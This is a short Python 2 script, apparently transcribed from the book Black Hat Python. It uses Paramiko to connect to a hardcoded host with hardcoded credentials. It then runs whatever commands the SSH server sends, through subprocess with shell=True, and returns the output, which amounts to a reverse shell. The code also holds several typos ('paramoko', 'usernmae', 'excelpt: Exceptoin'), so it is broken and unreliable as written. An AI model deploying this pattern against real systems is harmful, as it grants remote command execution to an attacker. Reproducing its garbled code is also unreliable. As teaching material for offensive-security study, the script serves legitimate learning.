 #!/ usr/bin/python

#Black Hat Python
#SSH with Paramiko
#pg 26

import threading, paramiko, subprocess

def ssh_command(ip, user, passwd, command):
	client = paramiko.SSHClient()
	#client.load_host_keys('/home/justin/.ssh/known_hosts')
	client.set_missing_host_key_policy(paramoko.AutoAddPolicy())
	client.connect(ip, usernmae= user, password= passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.exec_command(command)
		print ssh_session.recv(1024) 					#read banner
		while True:
			command = ssh_session.recv(1024)			#get the command from the SSH server
			try:
				cmd_output = subprocess.check_output(command, shell=True)
				ssh_session.send(cmd_output)
			excelpt: Exceptoin,e:
				ssh_session.send(str(e))
		client.close()
	return
ssh_command('192.168.100.131', 'justin', 'lovesthepython','id')


#End of Program